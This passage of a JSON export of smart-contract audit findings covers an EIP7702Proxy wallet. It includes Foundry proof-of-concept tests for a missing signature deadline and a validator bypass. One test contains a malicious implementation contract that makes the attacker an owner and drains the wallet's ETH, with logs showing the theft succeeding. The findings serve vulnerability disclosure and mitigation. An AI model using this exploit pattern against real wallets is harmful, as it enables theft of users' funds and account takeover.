it.\n- Certain upgrade scenarios that rely on ETH being sent along with the initialization call will fail.\n- The default upgradeToAndCall function typically allows ETH transfers, but this function does not, limiting its flexibility compared to standard implementations.\n\n## Impact Explanation\nThis issue is low severity because it does not introduce an exploitable vulnerability but instead restricts contract functionality. Users expecting to call payable functions in the new implementation immediately after an upgrade will be unable to do so, potentially requiring workarounds or additional transactions.\n\n## Likelihood Explanation\nThe likelihood is low because this issue only affects users who attempt to upgrade to an implementation that requires ETH during initialization. However, for those affected, it could introduce operational inconvenience and inefficiencies.\n\n## Recommendation\nadd payable to the `setImplementation` function"}, "help": {"text": "## Summary\nThe `setImplementation` function lacks the payable modifier, which prevents the contract from sending ETH during an upgrade. This makes it impossible for the owner to call payable functions in the new implementation during the initialization call, thereby breaking potential call combinations that require ETH transfers.\n\n## Finding Description\nThe `setImplementation` function currently does not have the payable modifier, which means that when it calls `upgradeToAndCall`, it cannot transfer ETH. As a result:\n- Any new implementation that requires ETH during initialization cannot receive it.\n- Certain upgrade scenarios that rely on ETH being sent along with the initialization call will fail.\n- The default upgradeToAndCall function typically allows ETH transfers, but this function does not, limiting its flexibility compared to standard implementations.\n\n## Impact Explanation\nThis issue is low severity because it does not introduce an exploitable vulnerability but instead restricts contract functionality. Users expecting to call payable functions in the new implementation immediately after an upgrade will be unable to do so, potentially requiring workarounds or additional transactions.\n\n## Likelihood Explanation\nThe likelihood is low because this issue only affects users who attempt to upgrade to an implementation that requires ETH during initialization. However, for those affected, it could introduce operational inconvenience and inefficiencies.\n\n## Recommendation\nadd payable to the `setImplementation` function"}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/40", "defaultConfiguration": {"level": "note"}}, {"id": "99a3e9d8-490c-4955-9a21-701cc28614f2", "name": "MissingDeadlineCheckInSetimplementation", "shortDescription": {"text": "Missing Deadline Check in setImplementation Function"}, "fullDescription": {"text": "## **01. Summary**\n\nThe `setImplementation` function in the EIP7702Proxy contract lacks a deadline check for signatures. This allows a signed message to remain valid indefinitely, potentially leading to unintended usage across different chains or at a later time.\n\n## **02. Vulnerability Details**\n\nThe user can set a new implementation using the `setImplementation` function. This requires an EOA signature, which is verified against a hash constructed as follows:\n\n```solidity\nbytes32 hash = keccak256(\n    abi.encode(\n        _IMPLEMENTATION_SET_TYPEHASH,\n        allowCrossChainReplay ? 0 : block.chainid,\n        _proxy,\n        nonceTracker.useNonce(),\n        ERC1967Utils.getImplementation(),\n        newImplementation,\n        keccak256(callData),\n        validator\n    )\n);\n```\n\nThe function uses this hash to verify the signature. However, there is no deadline or expiration mechanism, meaning the signature can be reused indefinitely if allowCrossChainReplay is enabled or if the nonce remains valid.\n\n## **03. Impact**\n\nIf `allowCrossChainReplay` is set to `true`, the signature can be reused across multiple chains. This could allow an attacker or unintended party to apply the signature on a different chain or at a later time, potentially causing unexpected behavior or unauthorized upgrades to the contract\u2019s implementation.\n\n## **04. Proof of Concept**\n\nThe proof of concept demonstrates that a signature remains valid even after a significant time delay (e.g., 10 years). The test signs a message, waits, and then successfully uses the same signature to call `setImplementation`. \n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\n\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\nimport {StorageSlot} from \"openzeppelin-contracts/contracts/utils/StorageSlot.sol\";\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\n/**\n * @title CoinbaseImplementationTest\n * @dev Tests specific to the CoinbaseSmartWallet implementation\n */\ncontract CoinbaseImplementationTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    CoinbaseSmartWallet _wallet;\n    CoinbaseSmartWallet _cbswImplementation;\n\n    // core contracts\n    EIP7702Proxy _proxy;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _cbswValidator;\n\n    // constants\n    bytes4 constant ERC1271_MAGIC_VALUE = 0x1626ba7e;\n    bytes4 constant ERC1271_FAIL_VALUE = 0xffffffff;\n\n    /// @dev Storage slot with the address of the current implementation (ERC1967)\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public virtual {\n        // Set up test accounts\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        // Deploy core contracts\n        _cbswImplementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _cbswValidator = new CoinbaseSmartWalletValidator(_cbswImplementation);\n\n        // Deploy proxy with receiver and nonce tracker\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n\n        // Get the proxy's runtime code\n        bytes memory proxyCode = address(_proxy).code;\n\n        // Etch the proxy code at the target address\n        vm.etch(_eoa, proxyCode);\n    }\n\n    // ======== PoC ========\n    function test_missingDeadlineCheck() public {\n        \n         // 1. The user signs a message to set the implementation.\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature = _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(_cbswImplementation));\n\n        // 2. A significant amount of time passes after the user signs the message.\n        skip(365 days * 10);\n\n        // 3. The signature is still valid despite the long delay.\n        EIP7702Proxy(_eoa).setImplementation(\n            address(_cbswImplementation),\n            initArgs,\n            address(_cbswValidator),\n            signature,\n            true\n        );\n    }\n\n    // ======== Utility Functions ========\n    /**\n     * @dev Creates initialization arguments for CoinbaseSmartWallet\n     * @param owner Address to set as the initial owner\n     * @return Encoded initialization arguments for CoinbaseSmartWallet\n     */\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    /**\n     * @dev Signs initialization data for CoinbaseSmartWallet that will be verified by the proxy\n     * @param signerPk Private key of the signer\n     * @param initArgs Initialization arguments to sign\n     * @return Signature bytes\n     */\n    function _signSetImplementationData(uint256 signerPk, bytes memory initArgs, address implementation) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0, // chainId 0 for cross-chain\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                implementation,\n                keccak256(initArgs),\n                address(_cbswValidator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    /**\n     * @dev Helper to read the implementation address from ERC1967 storage slot\n     * @param proxy Address of the proxy contract to read from\n     * @return The implementation address stored in the ERC1967 slot\n     */\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n\n    /**\n     * @dev Helper to create ECDSA signatures\n     * @param pk Private key to sign with\n     * @param hash Message hash to sign\n     * @return signature Encoded signature bytes\n     */\n    function _sign(uint256 pk, bytes32 hash) internal pure returns (bytes memory signature) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);\n        return abi.encodePacked(r, s, v);\n    }\n\n}\n```\n\nTo execute the PoC, place the above **`PoC.t.sol`** file in the **`/test`** directory and run the following command:\n\n```solidity\n$ forge test --mt test_missingDeadlineCheck -vv\n\nRan 1 test for test/PoC.t.sol:CoinbaseImplementationTest\n[PASS] test_missingDeadlineCheck() (gas: 212484)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.15ms (3.92ms CPU time)\n\nRan 1 test suite in 255.74ms (18.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n## 05. **Tools Used**\n\nManual Code Review and Foundry\n\n## **06. Recommended Mitigation**\n\nAdd a `deadline` parameter to the `setImplementation` function and include it in the hash calculation. Verify that the deadline has not passed by comparing it to `block.timestamp`. For example:\n\n```diff\nbytes32 internal constant _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n-   \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n+   \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator,uint256 deadline)\"\n);\n\n\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay,\n+   uint256 deadline\n) external {\n+   require(block.timestamp <= deadline, \"Signature expired\");\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator,\n+           deadline\n        )\n    );\n    // Rest of the function remains the same\n}\n```"}, "help": {"text": "## **01. Summary**\n\nThe `setImplementation` function in the EIP7702Proxy contract lacks a deadline check for signatures. This allows a signed message to remain valid indefinitely, potentially leading to unintended usage across different chains or at a later time.\n\n## **02. Vulnerability Details**\n\nThe user can set a new implementation using the `setImplementation` function. This requires an EOA signature, which is verified against a hash constructed as follows:\n\n```solidity\nbytes32 hash = keccak256(\n    abi.encode(\n        _IMPLEMENTATION_SET_TYPEHASH,\n        allowCrossChainReplay ? 0 : block.chainid,\n        _proxy,\n        nonceTracker.useNonce(),\n        ERC1967Utils.getImplementation(),\n        newImplementation,\n        keccak256(callData),\n        validator\n    )\n);\n```\n\nThe function uses this hash to verify the signature. However, there is no deadline or expiration mechanism, meaning the signature can be reused indefinitely if allowCrossChainReplay is enabled or if the nonce remains valid.\n\n## **03. Impact**\n\nIf `allowCrossChainReplay` is set to `true`, the signature can be reused across multiple chains. This could allow an attacker or unintended party to apply the signature on a different chain or at a later time, potentially causing unexpected behavior or unauthorized upgrades to the contract\u2019s implementation.\n\n## **04. Proof of Concept**\n\nThe proof of concept demonstrates that a signature remains valid even after a significant time delay (e.g., 10 years). The test signs a message, waits, and then successfully uses the same signature to call `setImplementation`. \n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\n\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\nimport {StorageSlot} from \"openzeppelin-contracts/contracts/utils/StorageSlot.sol\";\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\n/**\n * @title CoinbaseImplementationTest\n * @dev Tests specific to the CoinbaseSmartWallet implementation\n */\ncontract CoinbaseImplementationTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    CoinbaseSmartWallet _wallet;\n    CoinbaseSmartWallet _cbswImplementation;\n\n    // core contracts\n    EIP7702Proxy _proxy;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _cbswValidator;\n\n    // constants\n    bytes4 constant ERC1271_MAGIC_VALUE = 0x1626ba7e;\n    bytes4 constant ERC1271_FAIL_VALUE = 0xffffffff;\n\n    /// @dev Storage slot with the address of the current implementation (ERC1967)\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public virtual {\n        // Set up test accounts\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        // Deploy core contracts\n        _cbswImplementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _cbswValidator = new CoinbaseSmartWalletValidator(_cbswImplementation);\n\n        // Deploy proxy with receiver and nonce tracker\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n\n        // Get the proxy's runtime code\n        bytes memory proxyCode = address(_proxy).code;\n\n        // Etch the proxy code at the target address\n        vm.etch(_eoa, proxyCode);\n    }\n\n    // ======== PoC ========\n    function test_missingDeadlineCheck() public {\n        \n         // 1. The user signs a message to set the implementation.\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature = _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(_cbswImplementation));\n\n        // 2. A significant amount of time passes after the user signs the message.\n        skip(365 days * 10);\n\n        // 3. The signature is still valid despite the long delay.\n        EIP7702Proxy(_eoa).setImplementation(\n            address(_cbswImplementation),\n            initArgs,\n            address(_cbswValidator),\n            signature,\n            true\n        );\n    }\n\n    // ======== Utility Functions ========\n    /**\n     * @dev Creates initialization arguments for CoinbaseSmartWallet\n     * @param owner Address to set as the initial owner\n     * @return Encoded initialization arguments for CoinbaseSmartWallet\n     */\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    /**\n     * @dev Signs initialization data for CoinbaseSmartWallet that will be verified by the proxy\n     * @param signerPk Private key of the signer\n     * @param initArgs Initialization arguments to sign\n     * @return Signature bytes\n     */\n    function _signSetImplementationData(uint256 signerPk, bytes memory initArgs, address implementation) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0, // chainId 0 for cross-chain\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                implementation,\n                keccak256(initArgs),\n                address(_cbswValidator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    /**\n     * @dev Helper to read the implementation address from ERC1967 storage slot\n     * @param proxy Address of the proxy contract to read from\n     * @return The implementation address stored in the ERC1967 slot\n     */\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n\n    /**\n     * @dev Helper to create ECDSA signatures\n     * @param pk Private key to sign with\n     * @param hash Message hash to sign\n     * @return signature Encoded signature bytes\n     */\n    function _sign(uint256 pk, bytes32 hash) internal pure returns (bytes memory signature) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);\n        return abi.encodePacked(r, s, v);\n    }\n\n}\n```\n\nTo execute the PoC, place the above **`PoC.t.sol`** file in the **`/test`** directory and run the following command:\n\n```solidity\n$ forge test --mt test_missingDeadlineCheck -vv\n\nRan 1 test for test/PoC.t.sol:CoinbaseImplementationTest\n[PASS] test_missingDeadlineCheck() (gas: 212484)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.15ms (3.92ms CPU time)\n\nRan 1 test suite in 255.74ms (18.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n## 05. **Tools Used**\n\nManual Code Review and Foundry\n\n## **06. Recommended Mitigation**\n\nAdd a `deadline` parameter to the `setImplementation` function and include it in the hash calculation. Verify that the deadline has not passed by comparing it to `block.timestamp`. For example:\n\n```diff\nbytes32 internal constant _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n-   \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n+   \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator,uint256 deadline)\"\n);\n\n\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay,\n+   uint256 deadline\n) external {\n+   require(block.timestamp <= deadline, \"Signature expired\");\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator,\n+           deadline\n        )\n    );\n    // Rest of the function remains the same\n}\n```"}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/36", "defaultConfiguration": {"level": "error"}}, {"id": "b3ee8e44-7ef3-4d22-9afd-5001166693bb", "name": "ValidatorBypassVulnerabilityInEip7702proxy", "shortDescription": {"text": "Validator Bypass Vulnerability in EIP7702Proxy Allowing Unauthorized Implementation Upgrades"}, "fullDescription": {"text": "## **01. Summary**\n\nA vulnerability has been identified in the **`EIP7702Proxy`** contract that allows an attacker to bypass the **`AccountStateValidator`**. By exploiting the **`setImplementation`** function, an attacker can register a malicious implementation, perform unauthorized actions, and take control of the user's account. This vulnerability poses a significant risk to users' assets managed by the affected proxy contracts.\n\n## **02. Vulnerability Details**\n\nUsers of the **`EIP7702Proxy`** contract can register a new implementation by invoking the **`setImplementation`** function. This function utilizes a validator to verify the updated state and implementation. \n\n```solidity\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n\n    // Verify signature is from this address (the EOA)\n    address signer = ECDSA.recover(hash, signature);\n    if (signer != address(this)) revert InvalidSignature();\n\n    // Reset the implementation slot and call initialization if provided\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    // Validate wallet state after upgrade, reverting if invalid\n    bytes4 validationResult =\n        IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n}\n```\n\nHowever, there is a way to bypass this validator. The verification process using the validator takes place after the upgradeToAndCall function is executed. As a result, if a malicious implementation is registered, it can perform harmful actions first, then appropriately update the account state and modify the implementation to bypass the validation.\n\nThe critical issue arises because the validator's verification happens post-upgrade, allowing the malicious implementation to manipulate the contract state and bypass necessary validations.\n\nAdditionally, the setImplementation function can also bypass the Validator\u2019s verification through reentrancy in the upgradeToAndCall function. However, in this case, the user would need to sign the malicious hash twice, making it difficult to exploit.\n\n## **03. Impact**\n\nIf this vulnerability is exploited, an attacker can steal all of a user's assets or execute any desired actions on the user's account, resulting in an extremely critical impact. However, to carry out such an attack, the user must sign a transaction authorizing the malicious implementation, which significantly reduces the likelihood to very low.\n\nDespite the low likelihood, the severity is considered medium because the AccountStateValidator responsible for verifying the account state and the newly registered implementation may not function correctly. This flaw can lead users to place undue trust in the validator, causing them to inadvertently sign hashes that include malicious implementations.\n\nAdditionally, since the protocol is a wallet protocol that can be widely adopted across multiple platforms, the presence of frontends provided by the protocol does not sufficiently mitigate the risk. This widespread usage increases the potential for the vulnerability to manifest, reinforcing the classification of this issue as having medium severity.\n\n## **04. Proof of Concept**\n\nThe following Proof of Concept (PoC) demonstrates how the vulnerability can be exploited. By deploying a malicious implementation and interacting with the **`setImplementation`** function, an attacker can drain the user's funds and take ownership of the account.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\n\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\nimport {StorageSlot} from \"openzeppelin-contracts/contracts/utils/StorageSlot.sol\";\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\n/**\n * @title CoinbaseImplementationTest\n * @dev Tests specific to the CoinbaseSmartWallet implementation\n */\ncontract CoinbaseImplementationTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    CoinbaseSmartWallet _wallet;\n    CoinbaseSmartWallet _cbswImplementation;\n\n    // core contracts\n    EIP7702Proxy _proxy;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _cbswValidator;\n\n    // constants\n    bytes4 constant ERC1271_MAGIC_VALUE = 0x1626ba7e;\n    bytes4 constant ERC1271_FAIL_VALUE = 0xffffffff;\n\n    /// @dev Storage slot with the address of the current implementation (ERC1967)\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public virtual {\n        // Set up test accounts\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        // Deploy core contracts\n        _cbswImplementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _cbswValidator = new CoinbaseSmartWalletValidator(_cbswImplementation);\n\n        // Deploy proxy with receiver and nonce tracker\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n\n        // Get the proxy's runtime code\n        bytes memory proxyCode = address(_proxy).code;\n\n        // Etch the proxy code at the target address\n        vm.etch(_eoa, proxyCode);\n    }\n\n    // ======== PoC ========\n    function test_exploitValidatorBypass() public {\n\n        // 1. Fund EOA with 10 ETH\n        vm.deal(_eoa, 10 ether);\n        address attacker = makeAddr(\"attacker\");\n\n        emit log_named_decimal_uint(\"[Start] EOA ETH balance\", _eoa.balance, 18);\n        emit log_named_decimal_uint(\"[Start] Attacker ETH balance\", attacker.balance, 18);\n\n        // 2. Deploy malicious contract\n        MaliciousImpl maliciousImpl = new MaliciousImpl(address(_cbswImplementation), attacker);\n        \n        // 3. EOA sets a compromised implementation\n        // Despite using a trusted _cbswValidator, replacing the implementation with maliciousImpl does not revert.\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature = _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(maliciousImpl));\n\n        EIP7702Proxy(_eoa).setImplementation(\n            address(maliciousImpl),\n            initArgs,\n            address(_cbswValidator),\n            signature,\n            true\n        );\n\n        // 4. Attacker drains EOA\u2019s ETH and takes ownership\n        emit log_named_decimal_uint(\"[End] EOA ETH balance\", _eoa.balance, 18);\n        emit log_named_decimal_uint(\"[End] Attacker ETH balance\", attacker.balance, 18);\n\n        assertEq(true, CoinbaseSmartWallet(_eoa).isOwnerAddress(attacker));\n        console.log(\"Attacker now owns EOA\");\n\n        // Logs:\n        //     [Start] EOA ETH balance: 10.000000000000000000\n        //     [Start] Attacker ETH balance: 0.000000000000000000\n        //     [End] EOA ETH balance: 0.000000000000000000\n        //     [End] Attacker ETH balance: 10.000000000000000000\n    }\n\n    // ======== Utility Functions ========\n    /**\n     * @dev Creates initialization arguments for CoinbaseSmartWallet\n     * @param owner Address to set as the initial owner\n     * @return Encoded initialization arguments for CoinbaseSmartWallet\n     */\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    /**\n     * @dev Signs initialization data for CoinbaseSmartWallet that will be verified by the proxy\n     * @param signerPk Private key of the signer\n     * @param initArgs Initialization arguments to sign\n     * @return Signature bytes\n     */\n    function _signSetImplementationData(uint256 signerPk, bytes memory initArgs, address implementation) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0, // chainId 0 for cross-chain\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                implementation,\n                keccak256(initArgs),\n                address(_cbswValidator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    /**\n     * @dev Helper to read the implementation address from ERC1967 storage slot\n     * @param proxy Address of the proxy contract to read from\n     * @return The implementation address stored in the ERC1967 slot\n     */\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n\n    /**\n     * @dev Helper to create ECDSA signatures\n     * @param pk Private key to sign with\n     * @param hash Message hash to sign\n     * @return signature Encoded signature bytes\n     */\n    function _sign(uint256 pk, bytes32 hash) internal pure returns (bytes memory signature) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);\n        return abi.encodePacked(r, s, v);\n    }\n\n}\n\ncontract MaliciousImpl {\n\n    struct MultiOwnableStorage {\n        uint256 nextOwnerIndex;\n        uint256 removedOwnersCount;\n        mapping(uint256 index => bytes owner) ownerAtIndex;\n        mapping(bytes bytes_ => bool isOwner_) isOwner;\n    }\n\n    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    bytes32 private constant MUTLI_OWNABLE_STORAGE_LOCATION = 0x97e2c6aad4ce5d562ebfaa00db6b9e0fb66ea5d8162ed5b243f51a2e03086f00;\n\n    address immutable supportedImplementation;\n    address payable immutable attackerAddress;\n\n    constructor(address _supportedImplementation, address _attackerAddress) {\n        supportedImplementation = _supportedImplementation;\n        attackerAddress = payable(_attackerAddress);\n    }\n\n    function initialize(bytes[] calldata owners) external payable virtual {\n        evilExecute();\n        _setImplementation(supportedImplementation);\n    }\n\n    function evilExecute() public {\n        _addOwnerAtIndex(abi.encode(address(attackerAddress)));\n\n        (bool success, ) = attackerAddress.call{value: address(this).balance}(\"\");\n        require(success, \"failed evilExecute\");\n    }\n\n    function _addOwnerAtIndex(bytes memory owner) internal virtual {\n        MultiOwnableStorage storage $;\n\n        assembly (\"memory-safe\") {\n            $.slot := MUTLI_OWNABLE_STORAGE_LOCATION\n        }\n\n        $.isOwner[owner] = true;\n        $.ownerAtIndex[$.nextOwnerIndex] = owner;\n        $.nextOwnerIndex++;\n    }\n\n    function _setImplementation(address newImplementation) internal {\n        StorageSlot.AddressSlot storage $;\n\n        assembly (\"memory-safe\") {\n            $.slot := IMPLEMENTATION_SLOT\n        }\n\n        $.value = newImplementation;\n    }\n}\n```\n\nTo execute the PoC, place the above **`PoC.t.sol`** file in the **`/test`** directory and run the following command:\n\n```\n$ forge test --mt test_exploitValidatorBypass -vv\n\nRan 1 test for test/PoC.t.sol:CoinbaseImplementationTest\n[PASS] test_exploitValidatorBypass() (gas: 774399)\nLogs:\n  [Start] EOA ETH balance: 10.000000000000000000\n  [Start] Attacker ETH balance: 0.000000000000000000\n  [End] EOA ETH balance: 0.000000000000000000\n  [End] Attacker ETH balance: 10.000000000000000000\n  Attacker now owns EOA\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.88ms (6.89ms CPU time)\n```\n\nThe execution results demonstrate that the attacker successfully drained all ETH from the EOA and gained ownership of the wallet.\n\n## 05. **Tools Used**\n\nManual Code Review and Foundry\n\n## **06. Recommended Mitigation**\n\nTo mitigate this vulnerability, implement additional validation for the **`newImplementation`** address within the **`setImplementation`** function. This ensures that only trusted implementations can be registered, preventing unauthorized upgrades.\n\n```diff\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            